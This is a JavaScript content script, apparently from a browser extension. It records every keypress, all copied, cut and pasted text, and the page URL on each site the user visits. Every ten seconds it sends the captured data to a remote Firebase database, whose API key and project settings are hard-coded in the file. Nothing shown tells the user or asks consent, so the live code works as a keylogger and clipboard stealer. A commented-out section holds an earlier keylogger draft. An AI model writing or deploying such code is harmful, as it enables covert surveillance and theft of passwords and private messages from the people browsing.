//Firebase Initialization
var config = {
  apiKey: "AIzaSyDp8BOChOi_zaguCrDg8D_YP1NLHAlA_V0",
  authDomain: "test-be1cc.firebaseapp.com",
  databaseURL: "https://test-be1cc.firebaseio.com",
  projectId: "test-be1cc",
  storageBucket: "gs://test-be1cc.appspot.com",
  messagingSenderId: "1047082222814",
  appId: "1:1047082222814:web:4c0a9ff088bacca55eee4f",
  measurementId: "G-0392Q4KEVX"
};

firebase.initializeApp(config);


var keystroke = "";
toBeUpdated = false;
clipboardUpdate = false;
var clipboardText = "";


function writeUserData(keystroke) {
  epochTime = (new Date).getTime();
  let hostname = window.location.hostname;
  let activity = checkActivity(hostname);
  var data = {"keystroke":keystroke, "url":getUrl(), "activity": activity, "clipboardData" : clipboardText}
  firebase.database().ref('users/' + "nemnous/" + epochTime).set({
    data
  });
}

document.addEventListener("keypress",function(event){
  keystroke = keystroke.concat(event.key);
  toBeUpdated = true;
});

function getUrl(){
	let url = window.location.href;
	return url
}
function checkActivity(hostname){
	let qnahostnames = ["www.quora.com","stackoverflow.com","www.reddit.com","meta.stackoverflow.com","www.codeproject.com","groups.google.com","programmersheaven.com"];
	let codehostnames = ["colab.research.google.com"];
  let videohostnames = ["www.youtube.com"];
  
	if (qnahostnames.includes(hostname))
		return "Q&A";
	else if (codehostnames.includes(hostname))
		return "code";
	else if (videohostnames.includes(hostname))
		return "video";
	else
    return "search";
}
setInterval(function(){
  // writeUserData(keystroke);
  
  if(toBeUpdated || clipboardUpdate) {
  // console.log(JSON.stringify(data));
  writeUserData(keystroke);
  toBeUpdated = false;
  clipboardUpdate = false;
  clipboardText = "";
  keystroke = "";
  }
}, 10000);


function geSelectionText(){
  let selectedText = "";
  if(window.getSelection){
  selectedText = window.getSelection().toString();
  }
  return selectedText;
  }

  
  document.addEventListener('copy',function(){
  let text = geSelectionText();
  if(text.length>0){
    clipboardText = text;
    clipboardUpdate = true;
    console.log("Copied text",text);
  }
  },false)


  document.addEventListener('cut',function(){
  let text = geSelectionText();
  if(text.length>0){
    clipboardText = text;
    clipboardUpdate = true;
    console.log("This is cut text",text);
  }
  },false)
  
  
  document.addEventListener('paste',function(e){
  let data = e.clipboardData.getData('Text');
    clipboardText = data;
    clipboardUpdate = true;
  console.log("clipboardData",data);
  });

// var t = document.createElement("clipit");
// document.body.appendChild(t);
// t.focus();
// document.execCommand("paste");
// var clipboardText = t.value; //this is your clipboard data
// copyTextToClipboard("Hi" + clipboardText); //prepends "Hi" to the clipboard text
// document.body.removeChild(t);

// if (!firebase.apps.length) {
//   firebase.initializeApp(config);
// }

// var keystroke = "nani";


// document.addEventListener('keypress', function (e) {
//   e = e || window.event;
//   var charCode = typeof e.which == "number" ? e.which : e.keyCode;
//   if (charCode) {
//       log(String.fromCharCode(charCode));
//   }
// });


// var time = new Date().getTime();
// var thisdata = {};
// var shouldSave = false;
// var lastLog = time;
// thisdata[time] = "";
// var string = "";


// function log(input) {
//   var now = new Date().getTime();
//   // if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
//   thisdata[time] += input;
//   this.string = this.string + input;
//   shouldSave = true;
//   lastLog = now;
//   console.log("Logged",input,  JSON.stringify(this.string));
// }



// function writeUserData() {
//   console.log("write user data");
//   firebase.database().ref().child("users/naveen").set({
//     keystroke : JSON.parse( JSON.stringify(this.string) ),
//   });
// }

// var value = "";
// function saveKeys(key) {
//   value += key;
//   return value;
// }




// var link = document.getElementById('upload');
// if(link){
// link.addEventListener('click', function() {
//   alert(name);
//   writeUserData(name);
// });
// }



/**
 * Onclick for upload button
//  */
// document.addEventListener('DOMContentLoaded', function() {
//   var link = document.getElementById('upload');
//   if(link){
//   link.addEventListener('click', function() {
//     alert("name in upload" + name);
//     writeUserData(name);
// });
//   }
// }); 









/**
 * initApp handles setting up the Firebase context and registering
 * callbacks for the auth status.
 *
 * The core initialization is in firebase.App - this is the glue class
 * which stores configuration. We provide an app name here to allow
 * distinguishing multiple app instances.
 *
 * This method also registers a listener with firebase.auth().onAuthStateChanged.
 * This listener is called when the user is signed in or out, and that
 * is where we update the UI.
 *
 * When signed in, we also authenticate to the Firebase Realtime Database.
 */
// function initApp() {
//   // Listen for auth state changes.
//   // [START authstatelistener]
//   firebase.auth().onAuthStateChanged(function(user) {
//     if (user) {
//       // User is signed in.
//       var displayName = user.displayName;
//       var email = user.email;
//       var emailVerified = user.emailVerified;
//       var photoURL = user.photoURL;
//       var isAnonymous = user.isAnonymous;
//       var uid = user.uid;
//       var providerData = user.providerData;
//       // [START_EXCLUDE]
//       document.getElementById('quickstart-button').textContent = 'Sign out';
//       document.getElementById('quickstart-sign-in-status').textContent = 'Signed in';
//       document.getElementById('quickstart-account-details').textContent = JSON.stringify(user, null, '  ');
//       // [END_EXCLUDE]
//     } else {
//       // Let's try to get a Google auth token programmatically.
//       // [START_EXCLUDE]
//       document.getElementById('quickstart-button').textContent = 'Sign-in with Google';
//       document.getElementById('quickstart-sign-in-status').textContent = 'Signed out';
//       document.getElementById('quickstart-account-details').textContent = 'null';
//       // [END_EXCLUDE]
//     }
//     document.getElementById('quickstart-button').disabled = false;
//   });
//   // [END authstatelistener]

//   document.getElementById('quickstart-button').addEventListener('click', startSignIn, false);
// }

// /**
//  * Start the auth flow and authorizes to Firebase.
//  * @param{boolean} interactive True if the OAuth flow should request with an interactive mode.
//  */
// function startAuth(interactive) {
//   // Request an OAuth token from the Chrome Identity API.
//   chrome.identity.getAuthToken({interactive: !!interactive}, function(token) {
//     if (chrome.runtime.lastError && !interactive) {
//       console.log('It was not possible to get a token programmatically.');
//     } else if(chrome.runtime.lastError) {
//       console.warn(chrome.runtime.lastError.message);
//     } else if (token) {
//       // Authorize Firebase with the OAuth Access Token.
//       var credential = firebase.auth.GoogleAuthProvider.credential(null, token);
//       firebase.auth().signInWithCredential(credential).catch(function(error) {
//         // The OAuth token might have been invalidated. Lets' remove it from cache.
//         if (error.code === 'auth/invalid-credential') {
//           chrome.identity.removeCachedAuthToken({token: token}, function() {
//             startAuth(interactive);
//           });
//         }
//       });
//     } else {
//       console.error('The OAuth Token was null');
//     }
//   });
// }

// /**
//  * Starts the sign-in process.
//  */
// function startSignIn() {
//   document.getElementById('quickstart-button').disabled = true;
//   if (firebase.auth().currentUser) {
//     firebase.auth().signOut();
//   } else {
//     startAuth(true);
//   }
// }

// window.onload = function() {
//   initApp();
// };
